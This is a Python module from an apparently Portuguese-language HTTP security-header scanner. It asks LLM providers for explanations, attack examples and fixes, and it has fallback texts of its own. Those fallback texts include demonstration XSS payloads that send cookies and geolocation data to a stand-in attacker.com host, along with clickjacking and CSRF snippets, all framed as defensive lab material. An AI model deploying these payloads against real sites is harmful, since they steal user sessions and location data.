"""
llm.py — Integração com LLM (OpenAI / Anthropic / Google Gemini).

Gera explicações em linguagem natural para cada problema
encontrado nos security headers, e um resumo geral da análise.
"""

from __future__ import annotations

import asyncio
import hashlib
import os
from functools import lru_cache
from typing import Literal

from dotenv import load_dotenv

load_dotenv()

LLM_PROVIDER = os.getenv("LLM_PROVIDER", "openai").lower()
LLM_API_KEY = os.getenv("LLM_API_KEY", "")
LLM_MODEL = os.getenv("LLM_MODEL", "gpt-4o-mini")

# ──────────────────────────────────────────────
#  Cache simples em memória
# ──────────────────────────────────────────────

_cache: dict[str, str] = {}


def _cache_key(header_name: str, issues: list[str], severity: str) -> str:
    """Gera uma chave de cache baseada nos parâmetros."""
    raw = f"{header_name}|{'|'.join(sorted(issues))}|{severity}"
    return hashlib.sha256(raw.encode()).hexdigest()


# ──────────────────────────────────────────────
#  Prompts
# ──────────────────────────────────────────────

EXPLAIN_HEADER_PROMPT = """Você é um especialista sênior em segurança web e pentesting com mais de 15 anos de experiência. \
Gere uma análise COMPLETA, DIDÁTICA e PRÁTICA em português brasileiro sobre o problema encontrado no header HTTP.

Header: {header_name}
Valor atual: {header_value}
Problema(s): {issues}
Severidade: {severity}

Você DEVE retornar a resposta organizada EXATAMENTE com as seções abaixo (use os títulos exatos com ##):

## O que é este header
Explique de forma clara o que é o header, seu papel na segurança web, e por que ele existe. Use analogias simples quando possível para facilitar o entendimento.

## Risco real
Descreva detalhadamente os riscos REAIS e CONCRETOS para o site e seus usuários. Cite cenários específicos do mundo real onde essa vulnerabilidade foi explorada (se aplicável). Explique o impacto para diferentes stakeholders (usuários finais, empresa, dados).

## Exemplos de ataque
Forneça exemplos PRÁTICOS e REAIS de como um atacante poderia explorar essa falha. Inclua:
- Comandos curl, scripts Python, ou payloads que demonstrem o ataque
- Passo a passo do fluxo de ataque
- O que o atacante conseguiria obter

Use blocos de código com a linguagem especificada (bash, python, html, javascript).
Esses exemplos são para uso em AMBIENTE CONTROLADO de teste pelo blue team.

## Como corrigir
Forneça a correção EXATA com exemplos de configuração para:
- **Nginx**: bloco de configuração completo
- **Apache**: diretiva .htaccess ou httpd.conf
- **Node.js/Express**: middleware com código
- **Valor recomendado**: o valor ideal do header

Use blocos de código com a linguagem especificada.

## Teste de validação
Forneça comandos que o blue team pode usar para validar ANTES e DEPOIS da correção:
- Comando curl para verificar se o header está presente/correto
- Script ou one-liner para teste automatizado
- O que esperar no resultado antes da correção vs depois

Use blocos de código com a linguagem especificada (bash).

IMPORTANTE: Seja detalhado, didático e prático. O objetivo é que um profissional de segurança júnior consiga entender o problema, reproduzir o ataque em lab, corrigir, e validar a correção."""

SUMMARY_PROMPT = """Você é um especialista sênior em segurança web e consultor de cybersecurity. \
Gere um relatório executivo COMPLETO e DIDÁTICO em português brasileiro.

URL analisada: {url}
Score de segurança: {score}/100 ({classification})

Headers analisados:
{headers_summary}

Você DEVE retornar a resposta organizada EXATAMENTE com as seções abaixo (use os títulos exatos com ##):

## Visão geral
Avaliação geral da postura de segurança do site. Contextualize o score obtido — o que ele significa na prática. Compare com as melhores práticas da indústria (OWASP, Mozilla Observatory).

## Vulnerabilidades críticas
Liste e explique cada vulnerabilidade encontrada em ordem de prioridade (da mais crítica para a menos crítica). Para cada uma, explique brevemente o risco e o impacto potencial.

## Superfície de ataque
Descreva a superfície de ataque exposta com base nos headers ausentes ou mal configurados. Quais tipos de ataque o site está suscetível? (XSS, clickjacking, MITM, data injection, etc.) Explique como esses ataques se combinam para ampliar o risco.

## Plano de correção prioritizado
Crie uma lista numerada de ações de correção em ordem de prioridade, com:
- Qual header corrigir
- O que configurar
- Impacto esperado no score após correção
- Estimativa de esforço (baixo/médio/alto)

## Checklist de validação Blue Team
Forneça um checklist prático com comandos curl e ferramentas que o time de segurança pode usar para validar cada correção implementada. Use blocos de código bash.

IMPORTANTE: Seja completo, didático e orientado a ação. O relatório deve servir como guia para um time técnico implementar TODAS as correções necessárias."""


# ──────────────────────────────────────────────
#  Chamadas ao LLM
# ──────────────────────────────────────────────


async def _call_openai(prompt: str, api_key: str = "", model: str = "") -> str:
    """Chama a API da OpenAI."""
    from openai import AsyncOpenAI

    client = AsyncOpenAI(api_key=api_key or LLM_API_KEY)
    response = await client.chat.completions.create(
        model=model or LLM_MODEL,
        messages=[
            {"role": "system", "content": "Você é um especialista sênior em segurança web, pentesting e cybersecurity com mais de 15 anos de experiência. Você gera relatórios detalhados, didáticos e práticos para times de segurança (Blue Team). Sempre use blocos de código com a linguagem especificada para exemplos técnicos."},
            {"role": "user", "content": prompt},
        ],
        temperature=0.4,
        max_tokens=3000,
    )
    return response.choices[0].message.content.strip()


async def _call_anthropic(prompt: str, api_key: str = "", model: str = "") -> str:
    """Chama a API da Anthropic."""
    from anthropic import AsyncAnthropic

    client = AsyncAnthropic(api_key=api_key or LLM_API_KEY)
    response = await client.messages.create(
        model=model or LLM_MODEL,
        max_tokens=3000,
        messages=[{"role": "user", "content": prompt}],
        system="Você é um especialista sênior em segurança web, pentesting e cybersecurity com mais de 15 anos de experiência. Você gera relatórios detalhados, didáticos e práticos para times de segurança (Blue Team). Sempre use blocos de código com a linguagem especificada para exemplos técnicos.",
    )
    return response.content[0].text.strip()


async def _call_gemini(prompt: str, api_key: str = "", model: str = "") -> str:
    """Chama a API do Google Gemini."""
    from google import genai

    client = genai.Client(api_key=api_key or LLM_API_KEY)

    # Gemini não tem chamada async nativa, então roda em thread
    import asyncio
    response = await asyncio.to_thread(
        client.models.generate_content,
        model=model or LLM_MODEL,
        contents=f"Você é um especialista sênior em segurança web, pentesting e cybersecurity com mais de 15 anos de experiência. Você gera relatórios detalhados, didáticos e práticos para times de segurança (Blue Team). Sempre use blocos de código com a linguagem especificada para exemplos técnicos.\n\n{prompt}",
    )
    return response.text.strip()


async def _call_llm(prompt: str, provider: str = "", api_key: str = "", model: str = "") -> str:
    """Roteador: chama o provider correto."""
    p = (provider or LLM_PROVIDER).lower()
    if p == "anthropic":
        return await _call_anthropic(prompt, api_key, model)
    elif p == "gemini":
        return await _call_gemini(prompt, api_key, model)
    else:
        return await _call_openai(prompt, api_key, model)


# ──────────────────────────────────────────────
#  Funções públicas
# ──────────────────────────────────────────────


async def explain_header(
    header_name: str,
    issues: list[str],
    severity: str,
    header_value: str | None = None,
    llm_config: dict | None = None,
) -> str:
    """
    Gera explicação detalhada em linguagem natural para os problemas
    encontrados em um header específico, incluindo exemplos de ataque
    e comandos de validação para blue team.

    Usa cache para evitar chamadas duplicadas ao LLM.
    llm_config: optional dict com {provider, api_key, model} enviado pelo frontend.
    """
    if not issues or severity == "info":
        return ""

    cfg = llm_config or {}
    effective_key = cfg.get("api_key") or LLM_API_KEY

    if not effective_key or effective_key == "your-api-key-here":
        return _fallback_explanation(header_name, issues, severity)

    key = _cache_key(header_name, issues, severity)
    if key in _cache:
        return _cache[key]

    prompt = EXPLAIN_HEADER_PROMPT.format(
        header_name=header_name,
        header_value=header_value or "Ausente (não configurado)",
        issues="\n".join(f"- {issue}" for issue in issues),
        severity=severity,
    )

    try:
        explanation = await _call_llm(
            prompt,
            provider=cfg.get("provider", ""),
            api_key=cfg.get("api_key", ""),
            model=cfg.get("model", ""),
        )
        _cache[key] = explanation
        return explanation
    except Exception as e:
        # Fallback se a API falhar
        return _fallback_explanation(header_name, issues, severity)


async def generate_summary(
    url: str,
    score: float,
    classification: str,
    headers_data: dict,
    llm_config: dict | None = None,
) -> str:
    """
    Gera um resumo executivo da análise completa.
    """
    cfg = llm_config or {}
    effective_key = cfg.get("api_key") or LLM_API_KEY

    if not effective_key or effective_key == "your-api-key-here":
        return _fallback_summary(url, score, classification, headers_data)

    # Monta resumo dos headers para o prompt
    lines = []
    for key, data in headers_data.items():
        status = "✅ OK" if not data.get("issues") or data.get("severity") == "info" else f"⚠️ {data['severity'].upper()}"
        present = "Presente" if data.get("present") else "Ausente"
        value_info = f" | Valor: {data.get('value', 'N/A')[:100]}" if data.get("present") else ""
        lines.append(f"- {data['name']}: {status} ({present}{value_info})")
        for issue in data.get("issues", []):
            lines.append(f"  → {issue}")

    headers_summary = "\n".join(lines)

    prompt = SUMMARY_PROMPT.format(
        url=url,
        score=round(score, 1),
        classification=classification,
        headers_summary=headers_summary,
    )

    try:
        summary = await _call_llm(
            prompt,
            provider=cfg.get("provider", ""),
            api_key=cfg.get("api_key", ""),
            model=cfg.get("model", ""),
        )
        return summary
    except Exception:
        return _fallback_summary(url, score, classification, headers_data)


async def explain_all_headers(headers_data: dict, llm_config: dict | None = None) -> dict[str, str]:
    """
    Gera explicações para TODOS os headers com problemas, em paralelo.

    Retorna dict: header_key → explicação
    """
    tasks = {}
    for key, data in headers_data.items():
        issues = data.get("issues", [])
        severity = data.get("severity", "info")
        if issues and severity != "info":
            tasks[key] = explain_header(
                data["name"], issues, severity,
                header_value=data.get("value"),
                llm_config=llm_config,
            )

    if not tasks:
        return {}

    # Executa todas as chamadas ao LLM em paralelo
    keys = list(tasks.keys())
    results = await asyncio.gather(*[tasks[k] for k in keys], return_exceptions=True)

    explanations = {}
    for key, result in zip(keys, results):
        if isinstance(result, Exception):
            explanations[key] = "Não foi possível gerar explicação para este header."
        else:
            explanations[key] = result

    return explanations


# ──────────────────────────────────────────────
#  Fallback (sem API key configurada)
# ──────────────────────────────────────────────

_FALLBACK_DESCRIPTIONS: dict[str, dict[str, str]] = {
    "Strict-Transport-Security": {
        "desc": "O header HSTS (HTTP Strict Transport Security) instrui o navegador a acessar o site apenas via HTTPS, prevenindo ataques de downgrade de protocolo.",
        "risk": "Sem HSTS, um atacante pode interceptar conexões HTTP e realizar ataques Man-in-the-Middle (MITM), capturando credenciais e dados sensíveis.",
        "attack": "# Teste de vulnerabilidade MITM (ambiente controlado):\ncurl -v -I http://seu-site.com 2>&1 | grep -i 'location\\|strict'\n# Se redireciona para HTTPS sem HSTS, a primeira requisição é vulnerável",
        "fix": "# Nginx:\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n\n# Apache (.htaccess):\nHeader always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i strict-transport-security\n# Esperado: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "Content-Security-Policy": {
        "desc": "O CSP (Content Security Policy) controla de onde o navegador pode carregar recursos como scripts, estilos, imagens e fontes, sendo a principal defesa contra Cross-Site Scripting (XSS).",
        "risk": "Sem CSP, o site fica completamente vulnerável a ataques XSS. Um atacante pode injetar scripts maliciosos que roubam cookies, sessões, dados de formulários e credenciais dos usuários.",
        "attack": "# Teste de XSS (ambiente controlado):\n# Tente injetar em campos de input:\n<script>alert(document.cookie)</script>\n<img src=x onerror='fetch(\"https://attacker.com/steal?\"+document.cookie)'>\n\n# Sem CSP, esses payloads serão executados pelo navegador",
        "fix": "# Nginx:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-ancestors 'self';\" always;\n\n# Apache:\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\"",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i content-security-policy\n# Esperado: Content-Security-Policy com diretivas restritivas",
    },
    "X-Frame-Options": {
        "desc": "O X-Frame-Options impede que o site seja embutido em iframes de outros domínios, protegendo contra ataques de clickjacking.",
        "risk": "Sem esse header, um atacante pode criar uma página maliciosa que carrega seu site em um iframe invisível, enganando usuários para clicar em botões/links sem saber.",
        "attack": "<!-- Teste de clickjacking (ambiente controlado) -->\n<html><body>\n<h1>Clique para ganhar um prêmio!</h1>\n<iframe src=\"https://site-alvo.com/transfer\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe>\n</body></html>\n\n# Se o site carrega no iframe, está vulnerável",
        "fix": "# Nginx:\nadd_header X-Frame-Options \"DENY\" always;\n\n# Apache:\nHeader always set X-Frame-Options \"DENY\"\n\n# Ou use SAMEORIGIN se precisar de iframes do mesmo domínio",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i x-frame-options\n# Esperado: X-Frame-Options: DENY (ou SAMEORIGIN)",
    },
    "X-Content-Type-Options": {
        "desc": "O X-Content-Type-Options com valor 'nosniff' impede o navegador de adivinhar (MIME sniffing) o tipo de conteúdo de um recurso, forçando o uso do Content-Type declarado.",
        "risk": "Sem 'nosniff', um atacante pode fazer upload de um arquivo malicioso disfarçado (ex: um .js dentro de um .jpg) e o navegador pode executá-lo como script.",
        "attack": "# Teste de MIME sniffing (ambiente controlado):\n# Upload de arquivo com extensão .jpg mas conteúdo JavaScript:\necho '<script>alert(\"XSS via MIME sniffing\")</script>' > malicious.jpg\n# Sem nosniff, o navegador pode interpretar como script",
        "fix": "# Nginx:\nadd_header X-Content-Type-Options \"nosniff\" always;\n\n# Apache:\nHeader always set X-Content-Type-Options \"nosniff\"",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i x-content-type-options\n# Esperado: X-Content-Type-Options: nosniff",
    },
    "Referrer-Policy": {
        "desc": "O Referrer-Policy controla quanta informação de URL é enviada no cabeçalho Referer quando o usuário navega entre páginas ou faz requisições externas.",
        "risk": "Sem configuração restritiva, a URL completa (incluindo tokens, IDs de sessão, e parâmetros sensíveis) pode vazar para sites terceiros via cabeçalho Referer.",
        "attack": "# Teste de vazamento de Referer (ambiente controlado):\n# Se a URL contém dados sensíveis como:\n# https://site.com/reset-password?token=abc123\n# O Referer completo é enviado ao clicar em links externos\ncurl -v https://site-externo.com -H 'Referer: https://site.com/reset-password?token=abc123'",
        "fix": "# Nginx:\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n\n# Apache:\nHeader always set Referrer-Policy \"strict-origin-when-cross-origin\"",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i referrer-policy\n# Esperado: Referrer-Policy: strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "desc": "O Permissions-Policy (antigo Feature-Policy) controla quais APIs do navegador o site e iframes incorporados podem usar, como câmera, microfone, geolocalização e sensores.",
        "risk": "Sem restrições, scripts maliciosos injetados podem acessar câmera, microfone, geolocalização e outras APIs sensíveis do dispositivo do usuário sem bloqueio do navegador.",
        "attack": "# Teste de acesso a APIs sensíveis (ambiente controlado):\n# Sem Permissions-Policy, um XSS pode fazer:\nnavigator.geolocation.getCurrentPosition(pos => \n  fetch('https://attacker.com/loc?lat='+pos.coords.latitude+'&lng='+pos.coords.longitude)\n);\n# Ou acessar câmera/microfone via getUserMedia",
        "fix": "# Nginx:\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\" always;\n\n# Apache:\nHeader always set Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\"",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i permissions-policy\n# Esperado: Permissions-Policy com features restritivas ()",
    },
    "Set-Cookie": {
        "desc": "Cookies sem as flags de segurança adequadas (Secure, HttpOnly, SameSite) ficam expostos a diversos tipos de ataque.",
        "risk": "Cookies sem Secure podem ser interceptados em conexões HTTP. Sem HttpOnly, ficam acessíveis via JavaScript (risco de roubo via XSS). Sem SameSite, podem ser enviados em requisições cross-site (risco de CSRF).",
        "attack": "# Teste de roubo de cookie via XSS (ambiente controlado):\n# Sem HttpOnly, um XSS pode roubar o cookie:\n<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>\n\n# Sem SameSite, CSRF é possível:\n<img src='https://site-alvo.com/api/transfer?to=attacker&amount=1000'>",
        "fix": "# Node.js/Express:\nres.cookie('session', value, {\n  secure: true,\n  httpOnly: true,\n  sameSite: 'strict',\n  maxAge: 3600000\n});\n\n# Nginx (proxy):\nproxy_cookie_flags ~ secure httponly samesite=strict;",
        "test": "# Validação:\ncurl -s -I https://seu-site.com | grep -i set-cookie\n# Esperado: Set-Cookie com Secure; HttpOnly; SameSite=Strict",
    },
}


def _fallback_explanation(header_name: str, issues: list[str], severity: str) -> str:
    """Gera explicação detalhada e estruturada sem usar LLM."""
    data = _FALLBACK_DESCRIPTIONS.get(header_name)
    if not data:
        problems = "\n".join(f"• {issue}" for issue in issues)
        return f"O header {header_name} é um mecanismo de segurança HTTP.\n\nProblemas encontrados (severidade: {severity}):\n{problems}"

    problems = "\n".join(f"- {issue}" for issue in issues)

    return f"""## O que é este header
{data['desc']}

## Risco real
{data['risk']}

Problemas encontrados (severidade: **{severity}**):
{problems}

## Exemplos de ataque
```
{data['attack']}
```

## Como corrigir
```
{data['fix']}
```

## Teste de validação
```bash
{data['test']}
```"""


def _fallback_summary(url: str, score: float, classification: str, headers_data: dict) -> str:
    """Gera resumo detalhado e estruturado sem usar LLM."""
    critical_issues = []
    high_issues = []
    medium_issues = []
    all_issues_count = 0

    for key, data in headers_data.items():
        severity = data.get("severity", "info")
        for issue in data.get("issues", []):
            all_issues_count += 1
            entry = f"- **[{data['name']}]** {issue}"
            if severity == "critical":
                critical_issues.append(entry)
            elif severity == "high":
                high_issues.append(entry)
            elif severity == "medium":
                medium_issues.append(entry)

    summary = f"""## Visão geral
Análise de segurança de **{url}**: Score **{score:.1f}/100** ({classification}).
Foram encontrados **{all_issues_count}** problemas nos headers de segurança analisados.

## Vulnerabilidades críticas\n"""

    if critical_issues:
        summary += "Vulnerabilidades de severidade **CRÍTICA**:\n"
        summary += "\n".join(critical_issues) + "\n\n"
    if high_issues:
        summary += "Vulnerabilidades de severidade **ALTA**:\n"
        summary += "\n".join(high_issues) + "\n\n"
    if medium_issues:
        summary += "Vulnerabilidades de severidade **MÉDIA**:\n"
        summary += "\n".join(medium_issues) + "\n\n"
    if not critical_issues and not high_issues and not medium_issues:
        summary += "Nenhum problema crítico ou de alta severidade encontrado.\n\n"

    summary += """## Superfície de ataque
Com base nos headers ausentes ou mal configurados, o site pode estar suscetível a ataques como XSS, clickjacking, MITM, CSRF e vazamento de dados sensíveis. Configure uma API key de IA para obter uma análise completa da superfície de ataque.

## Plano de correção prioritizado
Corrija primeiro os headers com severidade crítica e alta, depois os de severidade média e baixa. Configure uma API key de IA nas configurações para obter um plano detalhado com exemplos de código.

## Checklist de validação Blue Team
```bash
# Verificação rápida de todos os headers de segurança:
curl -s -I https://""" + url.replace("https://", "").replace("http://", "") + """ | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy|set-cookie'
```"""

    return summary
